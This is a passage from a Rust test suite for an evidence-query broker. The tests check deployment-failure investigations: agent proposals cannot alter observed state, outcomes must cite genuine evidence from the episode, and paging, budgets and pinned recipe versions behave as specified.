        demo::DEMO_EPOCH + 10_001,
    );
    assert_eq!(unobserved.unwrap_err().code, ErrorCode::NotFound);
    assert!(!broker
        .store
        .graph
        .entities
        .contains_key(&entity_id(EntityKind::Zone, "ghost")));
}

/** 30. An accepted proposal naming another version does not change the zone's observed version
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn proposal_cannot_change_zone_version() {
    let (mut broker, result) = investigate(&demo::scenario().unwrap());
    let agent = Actor::new("claude@ses_demo01", ActorKind::Agent);
    broker
        .store
        .propose(
            &agent,
            zone_proposal(&result, "refunds", Some("v99"), Namespace::AgentProposed),
            demo::DEMO_EPOCH + 10_000,
        )
        .unwrap();
    let zone = &broker.store.graph.entities[&entity_id(EntityKind::Zone, "refunds")];
    assert_eq!(zone.version.as_deref(), Some("v3"));
    crate::capture::correlate::link::link_governance(&mut broker.store.graph);
    let scopes = broker
        .store
        .graph
        .relations
        .values()
        .filter_map(|relation| relation.version_scope.clone())
        .collect::<Vec<_>>();
    assert!(scopes.iter().any(|scope| scope == "zone:refunds@v3"));
    assert!(scopes.iter().all(|scope| !scope.contains("v99")));
}

/** 31. Class guard: no contribution operation (propose, review, supersede, expire) changes an
 * entity or a relation that existed before it; they may only add their own declared relations
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn contributions_never_mutate_observed_state() {
    let scenario = demo::scenario().unwrap();
    let (mut broker, result) = investigate(&scenario);
    let entities = broker.store.graph.entities.clone();
    let relations = broker.store.graph.relations.clone();
    let agent = Actor::new("claude@ses_demo01", ActorKind::Agent);
    let first = broker
        .store
        .propose(
            &agent,
            zone_proposal(&result, "refunds", Some("v99"), Namespace::AgentProposed),
            demo::DEMO_EPOCH + 10_000,
        )
        .unwrap();
    let mut second_proposal =
        zone_proposal(&result, "refunds", Some("v1"), Namespace::AgentProposed);
    second_proposal.content = json!({"hypothesis": "the worker reads the key too early"});
    let second = broker
        .store
        .propose(&agent, second_proposal, demo::DEMO_EPOCH + 10_001)
        .unwrap();
    broker
        .store
        .review(
            &demo::engineer(&scenario),
            &first,
            ContributionStatus::Accepted,
            "confirmed",
            demo::DEMO_EPOCH + 10_002,
        )
        .unwrap();
    let agent_policy = AccessPolicy {
        actor: agent.clone(),
        ..demo::engineer(&scenario)
    };
    broker
        .store
        .contributions
        .supersede(&agent_policy, &first, &second)
        .unwrap();
    broker.store.contributions.expire(u64::MAX);
    assert_eq!(broker.store.graph.entities, entities);
    for (id, relation) in &relations {
        assert_eq!(&broker.store.graph.relations[id], relation);
    }
    assert!(broker
        .store
        .graph
        .relations
        .iter()
        .filter(|(id, _)| !relations.contains_key(*id))
        .all(|(_, relation)| relation.status == RelationStatus::Declared
            && matches!(
                relation.relation_type,
                RelationType::ProposedFor | RelationType::DerivedFrom
            )));
}

/** 32. A verified outcome must cite evidence that exists; real evidence of the episode is accepted
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn outcome_requires_existing_evidence() {
    let scenario = demo::scenario().unwrap();
    let (mut broker, result) = investigate(&scenario);
    let episode = result.pack.episode_id.clone().unwrap();
    let engineer = Actor::new("oncall@acme.example", ActorKind::Human);
    let fabricated = broker.store.record_outcome(
        &episode,
        &engineer,
        true,
        EpisodeOutcome::Succeeded,
        vec!["evd_made_up".into()],
        demo::DEMO_EPOCH + 10_000,
    );
    assert_eq!(fabricated.unwrap_err().code, ErrorCode::EvidenceRequired);
    assert_eq!(broker.store.episodes[&episode].outcome, None);
    let unknown_episode = broker.store.record_outcome(
        "epi_missing",
        &engineer,
        true,
        EpisodeOutcome::Failed,
        Vec::new(),
        demo::DEMO_EPOCH + 10_001,
    );
    assert_eq!(unknown_episode.unwrap_err().code, ErrorCode::NotFound);
    let deployment = result
        .pack
        .evidence
        .iter()
        .filter(|item| item.evidence_type == EvidenceType::Deployment)
        .map(|item| item.evidence_id.clone())
        .collect::<Vec<_>>();
    broker
        .store
        .record_outcome(
            &episode,
            &engineer,
            true,
            EpisodeOutcome::Failed,
            deployment.clone(),
            demo::DEMO_EPOCH + 10_002,
        )
        .unwrap();
    assert_eq!(
        broker.store.episodes[&episode].outcome,
        Some(EpisodeOutcome::Failed)
    );
    assert_eq!(broker.store.episodes[&episode].outcome_evidence, deployment);
}

/** 33. Evidence captured for other work cannot support this episode's outcome
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn outcome_evidence_must_belong_to_episode() {
    let scenario = demo::scenario().unwrap();
    let (mut broker, result) = investigate(&scenario);
    let episode = result.pack.episode_id.clone().unwrap();
    let ci = scenario
        .resources
        .iter()
        .find(|resource| resource.resource_id == "ci")
        .unwrap();
    let definition = demo::definition(ci, &scenario);
    let foreign = broker.store.ingest(
        &definition,
        &record(
            "run-9999",
            EvidenceType::CiRun,
            json!({"ci_run": "run-9999", "commit": "abc1234", "status": "success"}),
            Some(1_759_990_000_000),
        ),
        &IngestPath {
            kind: "query".into(),
            id: "other".into(),
        },
        Some("epi_other_work"),
        None,
        demo::DEMO_EPOCH + 9_000,
    );
    let refused = broker.store.record_outcome(
        &episode,
        &Actor::new("oncall@acme.example", ActorKind::Human),
        true,
        EpisodeOutcome::Succeeded,
        vec![foreign.evidence_id],
        demo::DEMO_EPOCH + 10_000,
    );
    let error = refused.unwrap_err();
    assert_eq!(error.code, ErrorCode::EvidenceRequired);
    assert!(error.message.contains("does not belong"));
}

/** 34. A time window filters timed evidence only: policies and zones, which have no time, are
 * still collected, while a CI run outside the window is not
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn time_window_keeps_governance_evidence() {
    let scenario = demo::scenario().unwrap();
    let mut request = demo::request(&scenario);
    request.time_window = super::resources::scope::TimeWindow {
        since: Some(1_759_994_500_000),
        until: Some(1_759_996_000_000),
    };
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    let types = result
        .pack
        .evidence
        .iter()
        .map(|item| item.evidence_type)
        .collect::<BTreeSet<_>>();
    assert!(
        types.contains(&EvidenceType::Policy),
        "policies were dropped by the window"
    );
    assert!(
        types.contains(&EvidenceType::GraphState),
        "zones were dropped by the window"
    );
    assert!(
        !types.contains(&EvidenceType::CiRun),
        "a CI run before the window was kept"
    );
    let policies = result
        .pack
        .sources
        .iter()
        .find(|source| source.step_id == "policies")
        .unwrap();
    assert_eq!(policies.state, SourceState::Collected);
}

/** 35. Class guard: for every evidence type, the parser's missing-time issue and the time window
 * agree with EvidenceType::is_timed
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn time_rules_agree_with_is_timed() {
    use EvidenceType as E;
    let scenario = demo::scenario().unwrap();
    let definition = demo::definition(&scenario.resources[0], &scenario);
    for kind in [
        E::Task,
        E::PullRequest,
        E::CodeChange,
        E::CiRun,
        E::TestReport,
        E::Deployment,
        E::Verification,
        E::RuntimeLog,
        E::Metric,
        E::AgentSession,
        E::ToolCall,
        E::AgentEvent,
        E::GraphState,
        E::Policy,
        E::Validation,
        E::Configuration,
    ] {
        let source = record(
            "timeless",
            kind,
            json!({"text": "x", "points": [], "id": "z", "version": 1, "name": "n", "commit": "c", "files": []}),
            None,
        );
        let (artifact, stored) = super::format::artifact::capture(&definition, &source, 1, "test");
        let normalized = super::format::parsers::normalize(
            &definition,
            &source,
            &artifact,
            stored.as_ref(),
            1,
            None,
            None,
        );
        let time_issue = normalized
            .parse_issues
            .iter()
            .any(|issue| issue.field == "observed_at");
        assert_eq!(time_issue, kind.is_timed(), "{kind:?}: missing-time rule");
        let spec = QuerySpec {
            evidence_type: Some(kind),
            filters: Default::default(),
            since: Some(10),
            until: Some(20),
            limit: 10,
            cursor: None,
            scope: QueryScope::default(),
        };
        let kept = super::resources::connector::page(std::slice::from_ref(&source), &spec, None)
            .records
            .len();
        assert_eq!(kept == 1, !kind.is_timed(), "{kind:?}: time window rule");
    }
}

/** CI run records for a commit, enough to need several pages
 * Input
    - count: usize - how many
 * Output
    - Vec<SourceRecord>
*/
fn ci_runs(count: usize) -> Vec<SourceRecord> {
    (0..count)
        .map(|index| {
            let mut run = record(
                &format!("run-{index:04}"),
                EvidenceType::CiRun,
                json!({"ci_run": format!("run-{index:04}"), "commit": "9f1c2ab7d4", "status": "success", "repository": "acme/payments"}),
                Some(1_759_994_000_000 + index as u64),
            );
            run.metadata = [("commit".to_string(), "9f1c2ab7d4".to_string())]
                .into_iter()
                .collect();
            run
        })
        .collect()
}

/** 36. A query follows the source's pages up to the step's limit, and what is left is reported as
 * truncated instead of silently dropped
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn follows_cursors_within_budget() {
    let scenario = scenario_with(|scenario| {
        resource(scenario, "ci").records = ci_runs(120);
    });
    let mut broker = broker(&scenario);
    let ci_records = scenario
        .resources
        .iter()
        .find(|resource| resource.resource_id == "ci")
        .unwrap()
        .records
        .clone();
    broker
        .connect(
            "ci",
            Box::new(FixtureConnector::new(ci_records).with_behavior(FixtureBehavior::Pages(20))),
        )
        .unwrap();
    let result = broker
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    let ci = result
        .audit
        .steps
        .iter()
        .find(|step| step.step_id == "ci")
        .unwrap();
    assert_eq!(
        ci.record_ids.len(),
        50,
        "the step limit (50) is collected across pages"
    );
    assert_eq!(ci.pages, 3);
    assert!(ci.next_cursor.is_some());
    assert!(result.pack.warnings.iter().any(|warning| {
        warning.kind == WarningKind::Truncation && warning.refs == vec!["ci".to_string()]
    }));
}

/** 37. Paging stops at the record budget and still reports the truncation
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn stops_paging_at_budget() {
    let scenario = scenario_with(|scenario| {
        resource(scenario, "ci").records = ci_runs(40);
    });
    let mut broker = broker(&scenario);
    let ci_records = scenario
        .resources
        .iter()
        .find(|resource| resource.resource_id == "ci")
        .unwrap()
        .records
        .clone();
    broker
        .connect(
            "ci",
            Box::new(FixtureConnector::new(ci_records).with_behavior(FixtureBehavior::Pages(10))),
        )
        .unwrap();
    let mut request = demo::request(&scenario);
    request.budget.max_records = 12;
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    assert!(result.audit.usage.records <= 12);
    assert_eq!(result.audit.stop_reason, StopReason::BudgetExhausted);
    assert!(result
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Budget));
}

/** 38. Several known commits: the steps that check one commit say which others they did not check
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn multi_value_warns() {
    let scenario = demo::scenario().unwrap();
    let mut request = demo::request(&scenario);
    request.known.commits = vec!["9f1c2ab7d4".into(), "77aa0b1c2d".into()];
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    let warning = result
        .pack
        .warnings
        .iter()
        .find(|warning| {
            warning.kind == WarningKind::Completeness && warning.message.contains("77aa0b1c2d")
        })
        .expect("the unchecked commit is reported");
    assert!(warning.refs.contains(&"ci".to_string()));
    assert!(warning.refs.contains(&"tests".to_string()));
    assert!(warning.message.contains("checked only 9f1c2ab7d4"));
    let unchecked = result
        .pack
        .assertions
        .iter()
        .find(|assertion| {
            assertion.claim.predicate == "ci_passed" && assertion.claim.subject_key == "77aa0b1c2d"
        })
        .unwrap();
    assert_eq!(unchecked.truth(), Truth::Unknown);
}

/** 39. Every distinct commit a pull request or deployment names is learned, not only the first
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn two_deployments_learn_both_commits_and_warn() {
    let scenario = scenario_with(|scenario| {
        let deploy = resource(scenario, "deploy");
        let mut second = deploy.records[0].clone();
        second.record_id = "dep-7732".into();
        second.content["deployment"] = json!("dep-7732");
        second.content["commit"] = json!("77aa0b1c2d");
        second
            .metadata
            .insert("deployment".into(), "dep-7732".into());
        deploy.records.push(second);
    });
    let mut request = demo::request(&scenario);
    request.known.deployments = vec!["dep-7731".into(), "dep-7732".into()];
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    assert!(result
        .pack
        .scope
        .commits
        .contains(&"9f1c2ab7d4".to_string()));
    assert!(result
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Completeness
            && warning.message.contains("deployment values are known")
            && warning.message.contains("dep-7732")));
    let mut scope = super::resources::scope::ScopeResolution::default();
    let (definition, mut first, mut second) = {
        let deploy = scenario
            .resources
            .iter()
            .find(|resource| resource.resource_id == "deploy")
            .unwrap();
        (
            demo::definition(deploy, &scenario),
            deploy.records[0].clone(),
            deploy.records[2].clone(),
        )
    };
    first.evidence_type = EvidenceType::Deployment;
    second.evidence_type = EvidenceType::Deployment;
    for source in [&first, &second] {
        let (artifact, stored) = super::format::artifact::capture(&definition, source, 1, "test");
        let record = super::format::parsers::normalize(
            &definition,
            source,
            &artifact,
            stored.as_ref(),
            1,
            None,
            None,
        );
        scope.learn(&record);
    }
    assert_eq!(
        scope.commits,
        vec!["9f1c2ab7d4".to_string(), "77aa0b1c2d".to_string()]
    );
    assert_eq!(
        scope
            .learned
            .iter()
            .filter(|fact| fact.field == "commit")
            .count(),
        2
    );
}

/** 40. Class guard: a list-valued variable's template value is its first value, and exactly the
 * list-valued variables report their other values for the unchecked-values warning
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn list_variables_report_every_value() {
    let scope = super::resources::scope::ScopeResolution {
        task_id: Some("PAY-142".into()),
        repository: Some("acme/payments".into()),
        branch: Some("main".into()),
        commits: vec!["c1".into(), "c2".into()],
        pull_requests: vec!["p1".into(), "p2".into()],
        deployments: vec!["d1".into(), "d2".into()],
        environment: Some("staging".into()),
        sessions: vec!["s1".into(), "s2".into()],
        ..Default::default()
    };
    let mut listed = BTreeSet::new();
    for variable in super::broker::recipe::VARIABLES {
        let values = scope.values(variable);
        if values.is_empty() {
            assert!(scope.variable(variable).is_some(), "{variable} has a value");
        } else {
            assert_eq!(
                scope.variable(variable).as_ref(),
                values.first(),
                "{variable}"
            );
            listed.insert(*variable);
        }
    }
    assert_eq!(
        listed,
        BTreeSet::from(["commit", "pull_request", "deployment", "session"])
    );
}

/** A DataSea event store holding one agent tool call of a task known by both of its identities
 * Input
    - directory: &std::path::Path - runtime directory
 * Output
    - crate::telemetry::events::EventStore
*/
fn datasea_with_task(directory: &std::path::Path) -> crate::telemetry::events::EventStore {
    let store = crate::telemetry::events::EventStore::open(directory);
    let mut event = crate::telemetry::events::Event::new(
        "tool_call.decided",
        crate::telemetry::model::Domain::Authorization,
        "repo",
        "call-1",
    );
    event.scope.foxx_task_id = Some("tsk_1".into());
    event.scope.external_task_id = Some("PAY-142".into());
    event.scope.foxx_session_id = Some("ses_1".into());
    store.append(event).unwrap();
    store
}

/** 41. DataSea finds an agent's work by either identity of its task, and a session found by the
 * tracker's key is tied to the episode
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn datasea_matches_external_task_key() {
    let directory = tempfile::tempdir().unwrap();
    let connector =
        super::resources::local::DataSeaConnector::new(datasea_with_task(directory.path()));
    let query = |task: &str| {
        connector.query(&QuerySpec {
            evidence_type: Some(EvidenceType::ToolCall),
            filters: [("task".to_string(), task.to_string())]
                .into_iter()
                .collect(),
            since: None,
            until: None,
            limit: 10,
            cursor: None,
            scope: QueryScope::default(),
        })
    };
    assert_eq!(query("tsk_1").records.len(), 1, "the canonical id matches");
    assert_eq!(query("PAY-142").records.len(), 1, "the tracker key matches");
    assert_eq!(query("PAY-999").records.len(), 0, "another task does not");
    let source = query("PAY-142").records.remove(0);
    let scenario = demo::scenario().unwrap();
    let datasea = scenario
        .resources
        .iter()
        .find(|resource| resource.resource_id == "datasea")
        .unwrap();
    let definition = demo::definition(datasea, &scenario);
    let (artifact, stored) = super::format::artifact::capture(&definition, &source, 1, "test");
    let evidence = super::format::parsers::normalize(
        &definition,
        &source,
        &artifact,
        stored.as_ref(),
        1,
        Some("epi_1"),
        None,
    );
    let mut graph = EvidenceGraph::default();
    let episode = graph.add_entity(Entity::new(EntityKind::WorkEpisode, "epi_1"));
    link(
        &mut graph,
        &evidence,
        &LinkContext {
            task: Some("PAY-142"),
            episode: Some(&episode),
        },
    );
    assert!(relation(
        &graph,
        RelationType::ExecutedDuring,
        (EntityKind::AgentSession, "ses_1"),
        (EntityKind::WorkEpisode, "epi_1"),
    )
    .is_some());
}

/** 42. Class guard: every identity a task has (canonical and tracker) is matched by DataSea's task
 * filter; adding an identity form means adding it here
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn datasea_matches_every_task_identity() {
    let directory = tempfile::tempdir().unwrap();
    let connector =
        super::resources::local::DataSeaConnector::new(datasea_with_task(directory.path()));
    for identity in ["tsk_1", "PAY-142"] {
        let found = connector.query(&QuerySpec {
            evidence_type: None,
            filters: [("task".to_string(), identity.to_string())]
                .into_iter()
                .collect(),
            since: None,
            until: None,
            limit: 10,
            cursor: None,
            scope: QueryScope::default(),
        });
        assert_eq!(found.records.len(), 1, "{identity}");
    }
}

/** 43. Class guard: a published recipe version never changes. Editing a built-in recipe without
 * publishing a new version fails here; publish a new version and add its digest instead
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn builtin_recipe_versions_are_pinned() {
    let pinned = [
        (failed_deployment(), "905323d4d4a4bdc26d9f9506b7d05ca5"),
        (
            super::broker::recipe::local_change(),
            "fa1c896b0a92193d7f5f42111c4d3c11",
        ),
        (
            super::broker::recipe::failed_deployment_v2(),
            "652dd938be95c854f94b133c4c8554cb",
        ),
        (
            super::broker::recipe::deployment_discovery(),
            "f69457bba6d01555d869ff2da9fc8a15",
        ),
        (
            super::broker::recipe::pr_review(),
            "ad9f08d8327188f2b2a4b190777a4743",
        ),
    ];
    for (recipe, digest) in pinned {
        assert_eq!(
            recipe.digest(),
            digest,
            "{} v{} changed; publish a new version instead of editing a published one",
            recipe.recipe_id,
            recipe.version
        );
    }
}

/** Normalize a fixture deployment record with changed fields, for predicate tests
 * Input
    - scenario: &Scenario - scenario
    - id: &str - deployment id
    - status: &str - deployment status
 * Output
    - super::format::record::EvidenceRecord
*/
fn deployment_record(
    scenario: &Scenario,
    id: &str,
    status: &str,
) -> super::format::record::EvidenceRecord {
    let deploy = scenario
        .resources
        .iter()
        .find(|resource| resource.resource_id == "deploy")
        .unwrap();
    let definition = demo::definition(deploy, scenario);
    let mut source = deploy.records[0].clone();
    source.record_id = id.into();
    source.content["deployment"] = json!(id);
    source.content["status"] = json!(status);
    let (artifact, stored) = super::format::artifact::capture(&definition, &source, 1, "test");
    super::format::parsers::normalize(
        &definition,
        &source,
        &artifact,
        stored.as_ref(),
        1,
        None,
        None,
    )
}

/** 44. A condition with a subject looks only at the deployment under investigation; without one,
 * any failed deployment retrieved makes it hold
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn subject_bound_field_equals() {
    let scenario = demo::scenario().unwrap();
    let failed = deployment_record(&scenario, "dep-7731", "failed");
    let succeeded = deployment_record(&scenario, "dep-7730", "succeeded");
    let records = [&failed, &succeeded];
    let scope = super::resources::scope::ScopeResolution {
        deployments: vec!["dep-7730".into()],
        ..Default::default()
    };
    let unbound = Predicate::FieldEquals {
        evidence_type: EvidenceType::Deployment,
        field: "status".into(),
        value: "failed".into(),
        subject: None,
    };
    let bound = Predicate::FieldEquals {
        evidence_type: EvidenceType::Deployment,
        field: "status".into(),
        value: "failed".into(),
        subject: Some("{deployment}".into()),
    };
    assert!(
        unbound.holds(&records, &scope),
        "v1 semantics: any failed deployment"
    );
    assert!(
        !bound.holds(&records, &scope),
        "only the deployment under investigation"
    );
    let unknown = super::resources::scope::ScopeResolution::default();
    assert!(
        !bound.holds(&records, &unknown),
        "an unknown subject matches nothing"
    );
}

/** 45. Version 2 retrieves schema evidence because the change adds a migration, although the
 * deployment declares none; version 1 (published unchanged) still skips it
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn schema_runs_when_commit_adds_migration() {
    let scenario = demo::scenario().unwrap();
    let run = |version: u32| {
        let mut request = demo::request(&scenario);
        request.recipe = Some(super::broker::recipe::RecipeRef {
            id: "failed-deployment".into(),
            version: Some(version),
        });
        let mut broker = broker(&scenario);
        broker
            .investigate(request, &demo::engineer(&scenario))
            .unwrap()
    };
    let schema = |result: &crate::capture::broker::run::EvidenceQueryResult| {
        result
            .audit
            .steps
            .iter()
            .find(|step| step.step_id == "schema")
            .unwrap()
            .state
    };
    let v1 = run(1);
    assert_eq!(schema(&v1), StepState::Skipped);
    let v2 = run(2);
    assert_eq!(schema(&v2), StepState::Executed);
    assert!(v2
        .pack
        .evidence
        .iter()
        .any(|item| item.evidence_type == EvidenceType::Configuration));
    assert_eq!(v2.audit.recipe.as_ref().unwrap().version, 2);
    let mut book = RecipeBook::default();
    book.add(failed_deployment()).unwrap();
    book.add(super::broker::recipe::failed_deployment_v2())
        .unwrap();
    assert_eq!(book.for_class("deployment-failure").unwrap().version, 2);
    let empty_glob = super::broker::recipe::from_plan(
        vec![RecipeStep {
            when: Predicate::AnyFileMatches {
                glob: String::new(),
            },
            ..failed_deployment().steps[0].clone()
        }],
        Vec::new(),
    );
    assert_eq!(empty_glob.unwrap_err().code, ErrorCode::InvalidRecipe);
}

/** 46. A store remembers the content of every recipe version it ran; a broker whose recipe version
 * has other content than the store saw is refused
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn changed_builtin_recipe_is_refused() {
    let directory = tempfile::tempdir().unwrap();
    let first = EvidenceQueryBroker::new(
        ResourceRegistry::default(),
        CaptureStore::open(directory.path()).unwrap(),
        Clock::fixed(demo::DEMO_EPOCH),
    )
    .unwrap();
    first.store.save().unwrap();
    assert!(EvidenceQueryBroker::new(
        ResourceRegistry::default(),
        CaptureStore::open(directory.path()).unwrap(),
        Clock::fixed(demo::DEMO_EPOCH),
    )
    .is_ok());
    let state_path = directory.path().join("state.json");
    let mut state: Value =
        serde_json::from_str(&std::fs::read_to_string(&state_path).unwrap()).unwrap();
    assert_eq!(
        state["recipes"]["failed-deployment@v1"],
        json!(failed_deployment().digest())
    );
    state["recipes"]["failed-deployment@v1"] = json!("0123456789abcdef0123456789abcdef");
    std::fs::write(&state_path, serde_json::to_vec(&state).unwrap()).unwrap();
    let refused = EvidenceQueryBroker::new(
        ResourceRegistry::default(),
        CaptureStore::open(directory.path()).unwrap(),
        Clock::fixed(demo::DEMO_EPOCH),
    );
    let error = refused.err().expect("a changed recipe version is refused");
    assert_eq!(error.code, ErrorCode::InvalidRecipe);
    assert!(error
        .message
        .contains("publish the change as a new version"));
}

/** 47. A failing validation report yields policies_hold = No for the repository, reported beside
 * change_verified and never folded into it
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn failed_validation_yields_policies_hold_no() {
    use super::correlate::assertions::{derive, Subjects};
    let scenario = demo::scenario().unwrap();
    let crane = scenario
        .resources
        .iter()
        .find(|resource| resource.resource_id == "crane")
        .unwrap();
    let definition = demo::definition(crane, &scenario);
    let source = record(
        "validation",
        EvidenceType::Validation,
        json!({"passed": false, "generation": 7, "failures": 2, "findings": ["preserve_changed"]}),
        None,
    );
    let (artifact, stored) = super::format::artifact::capture(&definition, &source, 1, "test");
    let validation = super::format::parsers::normalize(
        &definition,
        &source,
        &artifact,
        stored.as_ref(),
        1,
        None,
        None,
    );
    let scope = super::format::record::RecordScope {
        repository: Some("acme/payments".into()),
        ..Default::default()
    };
    let subjects = Subjects {
        task: Some("PAY-142".into()),
        commits: Vec::new(),
        deployments: Vec::new(),
    };
    let derived = derive(&[&validation], &Default::default(), &subjects, &scope, 1);
    let policies = derived
        .iter()
        .find(|assertion| assertion.claim.predicate == "policies_hold")
        .expect("policies_hold is derived from the validation report");
    assert_eq!(
        (policies.truth(), policies.status),
        (Truth::No, AssertionStatus::Supported)
    );
    assert_eq!(policies.claim.subject_kind, EntityKind::Repository);
    let verified = derived
        .iter()
        .find(|assertion| assertion.claim.predicate == "change_verified")
        .unwrap();
    assert!(
        !verified.derived_from.contains(&policies.assertion_id),
        "policies_hold is not an input of change_verified"
    );
    let none = derive(&[], &Default::default(), &subjects, &scope, 1);
    assert!(none
        .iter()
        .all(|assertion| assertion.claim.predicate != "policies_hold"));
}

/** 48. The demonstration's commit is reported as touching the refunds zone and flow, at their
 * versions, supported by its change evidence
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn zone_touch_assertion_lists_zones() {
    let (_, result) = investigate(&demo::scenario().unwrap());
    let touched = result
        .pack
        .assertions
        .iter()
        .find(|assertion| assertion.claim.predicate == "governed_zone_touched")
        .expect("the governed zone touch is stated");
    assert_eq!(touched.claim.subject_key, "9f1c2ab7d4");
    assert_eq!(
        touched.claim.object,
        json!(["flow:refund-flow@v2", "zone:refunds@v3"])
    );
    assert_eq!(touched.status, AssertionStatus::Supported);
    assert!(!touched.supporting.is_empty());
    assert_pack_is_closed(&result.pack, "zone touch");
}

/** 49. Class guard: every evidence type a built-in recipe requires either feeds a deterministic rule
 * or is declared context only, so adding a requirement forces a decision about what concludes
 * from it
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn required_evidence_feeds_a_rule_or_is_context() {
    use super::correlate::assertions::{CONTEXT_ONLY, RULE_INPUTS};
    for recipe in [
        failed_deployment(),
        super::broker::recipe::failed_deployment_v2(),
        super::broker::recipe::local_change(),
    ] {
        for required in &recipe.required {
            assert!(
                RULE_INPUTS.contains(&required.evidence_type)
                    || CONTEXT_ONLY.contains(&required.evidence_type),
                "{} v{} requires {:?}, which feeds no rule and is not declared context only",
                recipe.recipe_id,
                recipe.version,
                required.evidence_type
            );
        }
    }
}

/** 50. A source that could not fully answer and returned nothing is Unavailable, not Empty; records
 * all withheld from the actor make the source Denied, not Empty
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn partial_and_withheld_answers_are_not_empty() {
    let scenario = demo::scenario().unwrap();
    let mut partial = broker(&scenario);
    let ci_records = scenario
        .resources
        .iter()
        .find(|resource| resource.resource_id == "ci")
        .unwrap()
        .records
        .clone();
    partial
        .connect(
            "ci",
            Box::new(FixtureConnector::new(ci_records).with_behavior(FixtureBehavior::Partial(0))),
        )
        .unwrap();
    let result = partial
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    let ci = result
        .pack
        .sources
        .iter()
        .find(|source| source.step_id == "ci")
        .unwrap();
    assert_eq!(ci.state, SourceState::Unavailable);
    let mut internal = demo::engineer(&scenario);
    internal.max_sensitivity = Sensitivity::Internal;
    let mut restricted_broker = broker(&scenario);
    let restricted = restricted_broker
        .investigate(demo::request(&scenario), &internal)
        .unwrap();
    let logs = restricted
        .pack
        .missing_evidence
        .iter()
        .find(|missing| missing.evidence_type == EvidenceType::RuntimeLog)
        .unwrap();
    assert_eq!(logs.state, SourceState::Denied);
}

/** 51. A requirement whose condition depends on evidence never retrieved stays required: without the
 * deployment, logs and metrics are still missing, so knowing less never looks more complete
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn unevaluable_condition_keeps_requirement() {
    let scenario = demo::scenario().unwrap();
    let mut request = demo::request(&scenario);
    request.known.deployments = Vec::new();
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    for kind in [EvidenceType::RuntimeLog, EvidenceType::Metric] {
        let missing = result
            .pack
            .missing_evidence
            .iter()
            .find(|missing| missing.evidence_type == kind)
            .unwrap_or_else(|| panic!("{kind:?} is still required"));
        assert!(missing.requirement.contains("condition"));
    }
    assert_eq!(result.pack.status, InvestigationStatus::Incomplete);
}

/** 52. With no task, commit, or deployment, the pack says no conclusions were derived
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn no_subjects_warns() {
    let scenario = demo::scenario().unwrap();
    let mut request = demo::request(&scenario);
    request.task_id = None;
    request.known.pull_requests = Vec::new();
    request.known.deployments = Vec::new();
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    assert!(result.pack.assertions.is_empty());
    assert!(result.pack.warnings.iter().any(|warning| {
        warning.kind == WarningKind::Uncertainty && warning.message.contains("no conclusions")
    }));
}

/** 53. A replay reports a source that has recovered, and stays in the original's work episode
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn replay_reports_recovered_source_and_reuses_episode() {
    let scenario = demo::scenario().unwrap();
    let mut broker = broker(&scenario);
    let mut request = demo::request(&scenario);
    request.task_id = None;
    let original = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    let episodes = broker.store.episodes.len();
    let metrics = scenario
        .resources
        .iter()
        .find(|resource| resource.resource_id == "metrics")
        .unwrap()
        .records
        .clone();
    broker
        .connect("metrics", Box::new(FixtureConnector::new(metrics)))
        .unwrap();
    let replay = broker
        .replay(&original.audit.query_id, &demo::engineer(&scenario))
        .unwrap();
    let comparison = replay.audit.replay.unwrap();
    assert_eq!(comparison.fidelity, ReplayFidelity::Diverged);
    assert!(comparison.differences.iter().any(|difference| {
        difference.starts_with("runtime-metrics") && difference.contains("executed in the replay")
    }));
    assert_eq!(
        broker.store.episodes.len(),
        episodes,
        "a replay opens no episode"
    );
    assert_eq!(replay.pack.episode_id, original.pack.episode_id);
}

/** 54. A request refused before any recipe ran is still audited (a named recipe that does not
 * exist, an invalid plan; a class no recipe serves is explored instead, see 85)
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn refusals_are_audited() {
    let scenario = demo::scenario().unwrap();
    let mut broker = broker(&scenario);
    let mut no_recipe = demo::request(&scenario);
    no_recipe.recipe = Some(RecipeRef {
        id: "no-such-recipe".into(),
        version: None,
    });
    let before = broker.store.audits.len();
    assert_eq!(
        broker
